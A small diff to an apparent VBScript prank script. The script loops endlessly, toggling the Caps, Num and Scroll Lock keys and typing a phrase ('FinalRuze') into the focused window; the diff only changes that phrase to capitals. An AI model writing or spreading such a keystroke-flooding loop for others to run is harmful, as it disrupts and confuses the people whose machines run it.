@@ -3,6 +3,6 @@ do
 wscript.sleep 100
 x.sendkeys "{CAPSLOCK}"
 x.sendkeys "{NUMLOCK}"
-x.sendkeys "This is the FinalRuze "
+x.sendkeys "THIS IS THE FINALRUZE "
 x.sendkeys "{SCROLLLOCK}"
 loop
